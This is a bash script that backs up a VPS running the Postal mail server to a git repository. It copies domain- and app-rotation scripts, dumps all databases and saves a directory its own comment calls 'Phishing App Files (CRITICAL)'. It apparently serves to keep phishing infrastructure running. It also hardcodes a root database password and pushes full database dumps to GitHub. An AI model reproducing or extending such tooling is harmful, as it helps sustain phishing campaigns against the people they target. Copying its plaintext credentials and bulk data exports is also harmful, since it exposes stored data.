#!/bin/bash

# Configuration
REPO_DIR="/root/vps-setup"
TIMESTAMP=$(date +"%Y-%m-%d %H:%M:%S")

cd "$REPO_DIR" || exit

echo "[$TIMESTAMP] Starting automated VPS state backup..."

# 1. Backup Postal & Router Configurations
echo "[$TIMESTAMP] Backing up configurations..."
cp -r /opt/postal/config/* "$REPO_DIR/configs/" 2>/dev/null || true
cp /opt/postal/apps-map.json "$REPO_DIR/configs/" 2>/dev/null || true
cp /opt/postal/rotate-domains.sh "$REPO_DIR/configs/" 2>/dev/null || true
cp /opt/postal/rotate-app.sh "$REPO_DIR/configs/" 2>/dev/null || true
cp /opt/postal/rotate-all-apps.sh "$REPO_DIR/configs/" 2>/dev/null || true
cp /opt/postal/router.js "$REPO_DIR/configs/" 2>/dev/null || true

# 2. Backup Phishing App Files (CRITICAL)
echo "[$TIMESTAMP] Backing up application files..."
rm -rf "$REPO_DIR/apps/*"  # Clear old apps before copying new ones
cp -r /opt/postal/caddy-data/apps/* "$REPO_DIR/apps/" 2>/dev/null || true

# 3. Backup Cron Jobs
echo "[$TIMESTAMP] Backing up cron jobs..."
cp /etc/cron.d/staticroute "$REPO_DIR/cron/" 2>/dev/null || true
crontab -l > "$REPO_DIR/cron/root-crontab" 2>/dev/null || true
echo "# Crontab backup - $TIMESTAMP" >> "$REPO_DIR/cron/root-crontab"

# 4. Dump Database
echo "[$TIMESTAMP] Dumping database..."
docker exec postal-mariadb mariadb-dump -u root -ppostal --all-databases > "$REPO_DIR/database/all_databases.sql" 2>/dev/null

# 5. Git Safety Check
git config user.name "VPS Backup Bot"
git config user.email "backup@local"

# 6. Check for Changes and Push
git add .

if git diff-index --quiet HEAD --; then
    echo "[$TIMESTAMP] No changes detected. Backup is up to date."
    exit 0
fi

# Commit and Push
git commit -m "Automated backup: $TIMESTAMP"
if git push origin main; then
    echo "[$TIMESTAMP] Backup pushed to GitHub successfully."
else
    echo "[$TIMESTAMP] ERROR: Failed to push to GitHub. Check your credentials and network."
    exit 1
fi
